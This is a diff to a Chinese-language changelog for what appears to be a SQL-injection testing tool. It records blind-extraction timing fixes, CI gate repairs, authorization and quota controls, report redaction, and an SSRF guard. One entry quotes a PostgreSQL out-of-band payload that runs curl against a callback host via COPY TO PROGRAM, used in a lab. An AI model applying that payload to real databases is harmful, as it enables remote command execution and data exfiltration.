@@ -4,6 +4,22 @@
 
 ## [Unreleased]
 
+### 2026-10-13 批次 D53 · 时间提取基线漂移跟踪 + 本批收口（三处实修）
+
+**一句话**：把时间盲注提取的判定阈值从「开头采 3 个样本、整条链共用」改为「随判假探针的免费 RTT 样本实时重算」；收口时修掉三处本批自带的缺陷——其中一处是**测试找出来的真缺陷**（判据先行、实现只落地一半）。
+
+| 面 | 变更 |
+|---|---|
+| 引擎 | `blindExtractor.js` 新增 `createBaselineTracker`（环形 5 样本 + 非对称估计：上行跟最新样本、下行由中位数兜底）；`extractTime` 的 `thresholdMs`/`timeoutMs` 每次探针重算，连续 `timeBaselineEvery` 个探针没拿到干净样本才补发一次原值请求（健康提取零额外请求）；`resolveTimeBaselineEvery` 非法值硬拒不静默回落 |
+| 入口 | `timeBaselineEvery` 进 CLI/档案/REST 白名单/scalarsCore/defaults（默认 16，`0` = 整条跟踪关闭，留给故障复现用） |
+| ★本批实修 1 | **失败探针的 elapsed 污染判定**：`timedTrue` 里 `t0` 在重试前不重置 ⇒「首次超时、重试成功」的探针 elapsed ≈ `timeoutMs + 真实 RTT`，这个混合值既不是 RTT 也不是失败，却必然 ≥ 阈值 ⇒ **该次被判成「条件为真」**。表现是长度二分在真值之上多收敛几位、产出 `"8036\u0000\u0000\u0000\u0000"`（尾 NUL = 越界位置 `ASCII('')`）——一个看着像数据的错值，正是文件头标注的危险形态 ②。修法：重试前重置 `t0`，失败分支只 `skip()` 不入样。★这条是 `extractor.timeDrift.test.js` 的判据**当场判红抓出来的**（提交前 3/3 确定性红）；A/B 复验：摘掉 `t0` 重置 ⇒ 10/11 红，装上 ⇒ 11/11 绿 |
+| ★本批实修 2 | `blindExtractor.js:714` 残留一行未还原的缺陷注入标记 `tracker.observe(elapsed); // INJECT-2`（全仓 grep 仅此一处）。它让「失败也入样」这条被注入的缺陷留在了工作树里；已按判据本意还原为 `skip()`，并同步改正测试文件里对根因的归因（原注释写「入样抬阈值 ⇒ 后续一切判假」，实测根因是混合耗时被直接判真） |
+| ★本批实修 3 | `greenguard-check.mjs --selftest` 把夹具写在 `scripts/`（= 它自己的扫描面）并在 `try` 里 `process.exit()` —— **Node 的 `process.exit` 同步终止，`finally` 不执行** ⇒ 夹具 `scripts/.greenguard-selftest-fake.mjs` 永久残留，而它恰好是判据 ① 的样本 ⇒ 下一轮 `greenguard` 自己判红。修法：夹具落 `os.tmpdir()` + 退出走 `process.exitCode`（两条都改：漏清也伤不到门禁，且 finally 真会跑） |
+| 接线 | `e2e/cross-module-lab/run.e2e.mjs` 登记进 `e2e/reference-labs.json`（CHANGELOG D2 行早就写了「6 已登记（含 cross-module）」但 JSON 没跟上 ⇒ 典型的硬编码结论句过期）。登记理由据实写明：该 runner 的 5 个场景里 4 个是逐条复跑 `server/tests/*`（已由 CI `test-server` 全量执行），脚本里的 `AUTH_DECLARATION_STRICT=lenient` 是装饰性的（被调测试文件自己 set/delete 该变量）；唯一非重复部分的两个 selftest **目前 ci.yml 一步都没跑**，属 CI 与 `scripts/ci-local.mjs` 的门禁漂移，另批处置 |
+| 文档数字 | `facts:refresh --coverage` 重采并回写 README（徽章 3969 → **4037**；服务端 **3481 用例 / 3477 pass / 0 fail / 4 skip**；覆盖率 lines **92.90 → 91.21**、branch 81.21、func 83.42 —— 本批新增 5 个源文件带下来的真实摊薄，不是测量口径变了） |
+| 门禁退出码 | 全绿：`refs:check`（此前 9 处「本机有、库里没有」）· `facts:check` · `readme:check` · `greenguard[:selftest]` · `arch:guard` · `nesting:guard` · `modules:check` · `version:check` · `e2e:wiring[:selftest]` · 前端 vitest 561/561 · 服务端 3481 用例 0 fail |
+
+
 ### 2026-10-12 批次 · 优化空间勘查落地（A1/A2/A3/B1/C1/C2/D1/D2/F 九项）
 
 **一句话**：按 `docs/优化空间勘查-2026-10-12.md` 落地九项——修掉一条已静默分叉的正确性漂移（`ERROR_SIG`）、补上 CLI 对 NoSQL/OOB 两个整通道的零可达、把两个门禁（变异敏感度 / e2e 靶场接线）从「靠信念」变成「会自证」，外加两处白烧。40 文件；性能项附量化、缺陷项附缺陷注入复验，门禁结论取实跑退出码。
@@ -47,6 +63,132 @@
 | 缺陷注入 | 5 发全杀：窄化方向反转（4 杀）/ between 误用 gt 收敛条件（挂死形态，已补截止时间包装）/ cap 退回段上界（长值测试精确命中）/ 非法值静默回落 / 时间通道 between 失效 |
 | 上游更正 | 候选原登记"对标 ghauri --fetch-using"——对 ghauri v1.0.5 与 v1.0.1#dev 整包取证 `--fetch-using`/`fetch_using` **0 命中**（仅无关方法名），ghauri 无此参数；按技术本身价值落地，不称对标。`in` 不实现：IN 为假时无法定位区间（k+1 个缺口全都可能），单值 IN 退化为线性扫描 |
 | 诚实边界 | 等值验证与 false 基准仍用 `=`（`=` 被过滤时整条通道本就不要命）；between 未经真机靶场验证（离线 mock oracle 双口径 + WAF 模拟），真机验证归 real-mysql-lab 下一轮 |
+
+### 2026-10-12 批次 D51 · 全维度优化（门禁/授权/脱敏/SSRF/检测增强）
+
+**一句话**：按 spec 5.1-5.6 六个能力模块全维度优化，覆盖 CI 门禁可靠性、授权可审计与配额防护、
+报告凭据脱敏、出站地址策略扩展、检测能力增强，新增 7 个源文件 + 6 个测试文件，47 条新测试全绿。
+
+#### 模块 1：CI 门禁可靠性加固
+
+| 子项 | 变更 |
+|---|---|
+| 1.1 | ci.yml 6 个有 `needs` 的下游 job 加 `if: always()` + 前置门禁检查步骤，前置失败时显式标注"前置未通过"而非静默跳过 |
+| 1.2 | package.json 新增 `quality:all` 脚本（指向 ci-local.mjs） |
+| 1.3 | 新建 `scripts/greenguard-check.mjs`（恒绿门禁检测器，支持 --selftest + waivers） |
+| 1.4 | 新建 `scripts/gate-recorder.mjs`（门禁运行记录器，三态 passed/failed/not_run） |
+| 1.5 | mutation-check.mjs 前端 runner 增加 tsc --noEmit 预检 |
+| 1.6 | mutation-check.mjs TARGETS 扩展前端目标 2→8 |
+| 1.7 | 新建 `scripts/coverage-calibration.mjs`（覆盖率回归校准，--selftest 验证门禁会拦） |
+
+#### 模块 2：授权可审计与配额防护
+
+| 子项 | 变更 |
+|---|---|
+| 2.1 | 新建 `server/src/core/authDeclaration.js`（validateDeclaration/extractDeclaration） |
+| 2.2 | 新建 `server/src/api/quotaMiddleware.js`（checkQuota/release，目标数 + 扇出配额） |
+| 2.3 | rateLimit.js tokenKeyOf 改为 SHA-256 摘要前 16 hex（消除 slice(0,8) 碰撞面） |
+| 2.4 | 新建 `server/src/services/authAudit.js`（recordAuthEvent，append-only auth.jsonl） |
+| 2.5 | exploitFlag.js 新增 checkExploitAuthorization；exploitRoutes.js requireAuth 接入授权声明→配额→审计三道门 |
+
+新增环境变量：`AUTH_DECLARATION_STRICT`（默认 strict，lenient 兼容旧布尔 authorized:true）、`QUOTA_TARGET_MAX`（20）、`QUOTA_FANOUT_MAX`（5）、`QUOTA_WINDOW_MS`（3600000）、`AUDIT_SINK_FAIL_MODE`（strict/lenient）
+
+#### 模块 3：报告凭据脱敏
+
+| 子项 | 变更 |
+|---|---|
+| 3.1 | 新建 `server/src/services/reportRedaction.js`（redactReport 统一脱敏管道） |
+| 3.2 | ReportGenerator._forExport 接入 redactReport（opts 缺省时零行为变化） |
+| 3.3 | sanitizeStart 新增 redactPasswords 开关；ScanManager.exportReport 注入 _redactOpts；报告导出路由支持 ?redactPasswords=1 |
+
+#### 模块 4：出站地址策略扩展
+
+| 子项 | 变更 |
+|---|---|
+| 4.1 | egressGuard.js IPv6 CIDR 逐段放行（复用 ipBytes 字节级前缀比较） |
+| 4.2 | healthRoutes.js 新增 egressPolicy 字段（level/allowCidrs/cloudMetadataBlocked） |
+| 4.3 | 云元数据不可豁免回归用例（SSRF_ALLOW_PRIVATE=1 时仍拒绝 169.254.169.254） |
+
+#### 模块 6：检测能力增强
+
+| 子项 | 变更 |
+|---|---|
+| 6.1 | 新建 `server/src/engine/detectorSupport/timingBaseline.js`（目标级 EWMA 动态基线，LRU 淘汰） |
+| 6.2 | TimeBlindDetector._robustDetect 接入目标级基线（扫描内样本不足时用 EWMA σ 兜底） |
+| 6.5 | verdictGuard.test.js 守卫：不可靠/0注入点/WAF全拦 → inconclusive（不得为 no_vulnerability_detected） |
+
+#### 新增测试（47 条全绿）
+
+- `server/tests/authQuota.test.js`（18 条：授权声明 + 配额 + 审计 + SHA-256 计额键）
+- `server/tests/exploitRoutes.authDeclaration.test.js`（5 条：严格模式集成）
+- `server/tests/reportRedaction.test.js`（8 条：脱敏管道）
+- `server/tests/reportRedaction.integration.test.js`（4 条：exportReport 接入）
+- `server/tests/ssrf.ipv6.test.js`（7 条：IPv6 CIDR + 云元数据 + 策略态）
+- `server/tests/timingBaseline.test.js`（7 条：EWMA + LRU + 降级）
+- `server/tests/verdictGuard.test.js`（5 条：结论不夸大守卫）
+
+#### 待后续（需外部依赖）
+
+- 6.3 真机验证矩阵（需 MySQL/PG/TiDB 等靶场）
+- 6.4 WAF 绕过基准（需 ModSecurity + CRS 容器）
+
+### 2026-10-12 批次 D50 · PG 三套真机靶场首次进 CI：先拆掉两个「接进去只会买到恒绿」的假绿源（TODO 15.4 剩账 ①）
+
+**一句话**：`oob-real-lab` / `pg-osshell` / `concurrent-isolation` 三套的 deps 含 pg，CI 从未起过 PG
+⇒ 自写下起**从未在任何自动门禁里执行过**。但**直接接线是错的**：其中两套的退出码恒 0
+（一个结尾无条件 `exit(0)`，一个"PG 连不上"静默 SKIP），接进去只会得到一个「天天绿、一次没真跑」
+的 step —— 比天天红更糟。故本批的顺序是：**先修判据，再接线，最后上守卫**。
+
+#### ① 两个假绿源（都是真读代码读出来的，不是猜的）
+
+| 文件 | 缺陷 | 后果 |
+|---|---|---|
+| `e2e/oob-real-lab/verify.mjs` | 结尾**无条件** `process.exit(0)` | OOB 没命中、对照组误报都只打一行「需排查」，退出码照样 0 ⇒ 接它的门禁**恒绿** |
+| `e2e/oob-real-lab/pg-osshell.e2e.mjs` | PG 连接**写死** `127.0.0.1:5432` / `postgres` / `postgres`（不读 `PG_*`）；且 PG 连不上 / 非 superuser 时 `exit(0)` SKIP | PG 不在默认端口就永远连不上 ⇒ 走 SKIP ⇒ 又是恒绿。两个缺陷叠加，比单独一个更隐蔽 |
+
+修法：
+- `verify.mjs`：`process.exit(pass ? 0 : 1)`，断言落到退出码上；
+- `pg-osshell`：连接统一取自 `lab-app.mjs` 的 `PG_CONF`（本批把它导出，单一来源，不再各读一套），
+  并加 `PG_REQUIRE=1` 开关 —— 口径同仓库既有的 `RECALL_REQUIRE_MYSQL` / `MODSEC_REQUIRE_DB`：
+  **默认 SKIP 是对的**（本机没 PG 不是代码缺陷），但"已经专门起了 PG 的门禁里跳过"= 降级 = 必须红。
+
+#### ② 接线：用 runner 自带的 PG，不用 docker
+
+`ubuntu-24.04` runner 预装 **PostgreSQL 16.15**（服务默认关闭，`sudo systemctl start postgresql.service`）。
+选宿主 PG 而非容器的**唯一理由**是 OOB 链路的形态：由 **PG 服务进程**执行
+`COPY (SELECT '') TO PROGRAM 'curl {CALLBACK}'` ⇒ curl 必须存在于"PG 所在那一侧"，
+宿主天然满足，官方 postgres 镜像不保证装了 curl。
+同时把原「尝试启动 PostgreSQL（失败不阻塞）」那一步从 `continue-on-error` 改成**阻塞 + 三条取证**
+（①TCP 可连 ②是 superuser，COPY FROM PROGRAM 仅限超管 ③PG 那一侧有 curl）——
+既然三套已修成真判据，这一步再吞掉失败就只剩一个坏处：真正的现场被 `|| true` 抹平。
+
+#### ③ 本机实测（**不起任何数据库**，用生产一致输入）
+
+| 场景 | 实测输出 |
+|---|---|
+| 不设开关（本机无 PG） | `[SKIP] PG 不可连（127.0.0.1:5432）… 属环境缺项` + **退出码 0** ✓ |
+| `PG_REQUIRE=1` | `[FAIL] … 已设 PG_REQUIRE=1，跳过即降级 ⇒ 判失败` + **退出码 1** ✓ |
+| `PG_REQUIRE=1 PGPORT=59999` | 报错端口**随之变成 59999** ✓ —— 证明真读了 env，不再写死 5432 |
+
+第三行是最硬的证据：旧代码会忽略 `PGPORT`、永远连 5432。
+
+#### ④ 守卫（`server/tests/ciWiring.guard.test.js` 新增 ③④ + 一条自证）
+
+- ③ 三套必须在 ci.yml 里以 `node <entry>` 接线（**原来根本没有这道闸** —— 本文件的 ①② 只盯
+  `*.test.mjs`，这三套是 `*.e2e.mjs` / `verify.mjs`，压根不在视野里，这就是它们能隐形的原因）；
+- ④ 三套最后一个 `process.exit` 不得是字面量 `0`、不得写死 PG 端口/口令、
+  SKIP 必须真受 `PG_REQUIRE` 控制。
+- 缺陷注入 **5 发全中**：退回无条件 `exit(0)` / 退回硬编码连接 / 删掉 ci.yml 接线 /
+  删掉读开关那行 / 保留读开关但不再按它分支。还原（备份 `cp`）后 8/8 绿。
+- ⚠️ 其中「删掉读开关」一发**第一版判据没红**：原本用 `includes('PG_REQUIRE')` 查，删掉代码后
+  注释里还写着 `PG_REQUIRE=1` ⇒ 守卫绿着放行。已改成查 `process.env.PG_REQUIRE` 与
+  `if (PG_REQUIRE) {` 两个**代码形态**。这是本仓第三次栽在"判据的文本源没排注释"上。
+
+#### ⑤ 未验证项（如实标注）
+
+- **CI 首跑未确认**：本机无 PG、无 docker，无法先验。若 runner 的 PG 起不来，三套会**红**
+  （而不是悄悄 SKIP）—— 这正是本批要的结果：让"从没跑过"这件事第一次变得可见。
+- 15.4 的剩账 **②（`ensure_database` / `pg_ready` 无单测）仍未做**。
 
 ### 2026-10-12 批次 D49 · 桌面导出/导入授权范围：按决策 (a) 放开 `$DOWNLOAD/**`，并堵掉守卫的「只看标识」假绿（TODO 第 14 条）
 
